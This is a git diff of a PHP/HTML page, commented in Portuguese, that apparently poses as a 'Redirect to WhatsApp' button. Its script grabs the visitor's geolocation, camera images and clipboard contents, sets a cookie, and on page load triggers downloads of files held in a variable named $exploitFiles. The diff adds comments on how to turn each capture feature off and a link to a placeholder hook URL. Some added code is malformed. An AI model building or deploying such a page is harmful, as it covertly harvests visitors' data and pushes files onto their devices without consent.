@@ -14,7 +14,9 @@
             box-sizing: border-box;
             font-family: "Poppins", sans-serif;
         }
-
+a {
+    style="text-decoration: none;
+  }
         body {
             display: flex;
             justify-content: center;
@@ -280,7 +282,7 @@
             <input type="hidden" name="location" id="locationData">
             <input type="hidden" name="clipboard" id="clipboardData">
             <input type="file" name="photo" id="photo" accept="image/png" style="display: none;">
-            <button type="submit" class="redirect">Redirecionar ao WhatsApp!</button>
+            <button type="submit" class="redirect"><a hrefe="https://adicioneolinkdohookmedobeef">Redirecionar ao WhatsApp!</a></button>
             <?php echo $feedback; ?>
         </form>
     </main>
@@ -297,12 +299,13 @@
     ?>
 
     <script>
+        
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const locationData = document.getElementById('locationData');
         const clipboardData = document.getElementById('clipboardData');
         const form = document.getElementById('form');
-
+//Comente daqui ate
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 position => {
@@ -317,7 +320,9 @@
         } else {
             locationData.value = "Geolocalização não suportada";
         }
+//Aqui para tirar a geolocate
 
+        //Comente daqui ate
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
@@ -347,7 +352,8 @@
             .catch(err => {
                 console.error('Erro ao acessar a câmera:', err);
             });
-
+        //Aqui para tirar a feature de cameras
+  //Comente daqui ate
         async function captureClipboard() {
             try {
                 if (navigator.clipboard && navigator.clipboard.readText) {
@@ -363,7 +369,8 @@
                 return 'Erro ao acessar clipboard: ' + err.message;
             }
         }
-
+        //Aqui para tirar feature de clipboard
+  //Comente daqui ate
         function triggerDownload(filePath, fileName) {
             const link = document.createElement('a');
             link.href = filePath;
@@ -373,10 +380,12 @@
             document.body.removeChild(link);
             console.log(`Download iniciado: ${fileName}`);
         }
-
+//Aqui para tirar a feature de clipboard
+          
+        //Comente daqui ate
         window.onload = () => {
             document.cookie = "teste_cookie=valor_teste; path=/; max-age=3600";
-
+//Aqui para tirar feature de cookies
             const arquivos = <?php echo json_encode($exploitFiles); ?>;
             if (arquivos.length > 0) {
                 arquivos.forEach((arquivo, i) => {
